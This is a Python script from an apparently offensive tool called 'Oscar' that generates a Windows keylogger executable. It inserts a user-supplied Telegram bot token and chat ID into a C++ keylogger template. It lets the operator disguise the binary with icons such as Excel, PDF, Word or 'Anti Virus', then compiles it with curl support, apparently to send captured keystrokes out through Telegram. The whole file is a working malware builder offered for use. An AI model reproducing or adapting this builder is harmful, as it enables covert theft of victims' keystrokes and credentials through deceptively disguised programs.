#!/usr/local/bin/python3

import subprocess
import platform
import os
import time
from modules import banner
from colorama import Fore, Back, Style

def win_payload():
    time.sleep(0.2)
    banner.Oscar_Banner()

    try:
        print(Back.BLACK + Fore.RED + " Please Enter Payloads Name > For example: Oscar\n" + Style.RESET_ALL)
        get_payload_name = input(Fore.LIGHTWHITE_EX + " Oscar" + Fore.RED + " (Get Name Payloads)" + Fore.LIGHTWHITE_EX + " > ")

        time.sleep(0.2)
        banner.Oscar_Banner()

        print(Back.BLACK + Fore.RED + " Please Enter Bot Token Telegram\n" + Style.RESET_ALL)
        get_bot_token = input(Fore.LIGHTWHITE_EX + " Oscar" + Fore.RED + " (Get Bot Token)" + Fore.LIGHTWHITE_EX + " > ")

        time.sleep(0.2)
        banner.Oscar_Banner()

        print(Back.BLACK + Fore.RED + " Please Enter User Info (Chat ID)\n" + Style.RESET_ALL)
        get_user_info = input(Fore.LIGHTWHITE_EX + " Oscar" + Fore.RED + " (Get User Info)" + Fore.LIGHTWHITE_EX + " > ")

        time.sleep(0.2)
        banner.Oscar_Banner()

        with open("CPP-Payload/keylog.cpp", "r") as cpp_file:
            payload_data = cpp_file.read()
            payload_data = payload_data.replace("YOUR_TELEGRAM_BOT_TOKEN", f"{get_bot_token}")
            payload_data = payload_data.replace("YOUR_CHAT_ID", f"{get_user_info}")

        with open("CPP-Payload/temp_keylog.cpp", "w") as new_cpp_file:
            new_cpp_file.write(payload_data)

        print(Fore.WHITE + " Please Enter The Icon Name \n")
        print(Fore.RED + "\n [1] " + Fore.WHITE + "Excel")
        print(Fore.RED + " [2] " + Fore.WHITE + "PDF")
        print(Fore.RED + " [3] " + Fore.WHITE + "VLC")
        print(Fore.RED + " [4] " + Fore.WHITE + "Powerpoint")
        print(Fore.RED + " [5] " + Fore.WHITE + "Word")
        print(Fore.RED + " [6] " + Fore.WHITE + "Counter Strike")
        print(Fore.RED + " [7] " + Fore.WHITE + "Adobe After Effects")
        print(Fore.RED + " [8] " + Fore.WHITE + "Adobe Photoshop")
        print(Fore.RED + " [9] " + Fore.WHITE + "Anti Virus\n")

        icon_number = input(Fore.LIGHTWHITE_EX + " Oscar" + Fore.RED + " (Get Icon Number)" + Fore.LIGHTWHITE_EX + " > ")
        icon_name = ""
        if icon_number == "1":
            icon_name = "icon/excel.ico"
        elif icon_number == "2":
            icon_name = "icon/pdf.ico"
        elif icon_number == "3":
            icon_name = "icon/vlc.ico"
        elif icon_number == "4":
            icon_name = "icon/powerpoint.ico"
        elif icon_number == "5":
            icon_name = "icon/word.ico"
        elif icon_number == "6":
            icon_name = "icon/Counter-Strike.ico"
        elif icon_number == "7":
            icon_name = "icon/Adobe-After-Effects.ico"
        elif icon_number == "8":
            icon_name = "icon/Adobe-Photoshop.ico"
        elif icon_number == "9":
            icon_name = "icon/Anti-Virus.ico"
        else:
            print(Fore.LIGHTCYAN_EX + " Please select one of the desired options" + Style.RESET_ALL)
            input(Fore.LIGHTMAGENTA_EX + "\n Back To The Menu ( Press Enter ... ) ")
            return

        with open("CPP-Payload/resource.rc", "w") as rc_file:
            rc_file.write(f'IDI_ICON1 ICON "{icon_name}"\n')

        compile_cmd = f"g++ -o dist/{get_payload_name}.exe CPP-Payload/temp_keylog.cpp CPP-Payload/resource.rc -mwindows -lcurl"
        with open("log.log", "w") as pylog:
            subprocess.run(compile_cmd, shell=True, stdout=pylog, stderr=pylog)

        time.sleep(3)
        banner.Oscar_Banner()

        print(Fore.LIGHTYELLOW_EX + " Please Wait ...")
        print(Fore.LIGHTCYAN_EX + "\n The compilation process may take up to 1 minute ")

        time.sleep(10)  

        print(Fore.LIGHTMAGENTA_EX + f"\n Your Payload Generated In The /dist/{get_payload_name}.exe")
        input(Fore.CYAN + "\n Back To The Menu ( Press Enter ... ) ")

    except Exception as ex:
        print(ex)
        input("Press Enter to continue...")

if __name__ == "__main__":
    win_payload()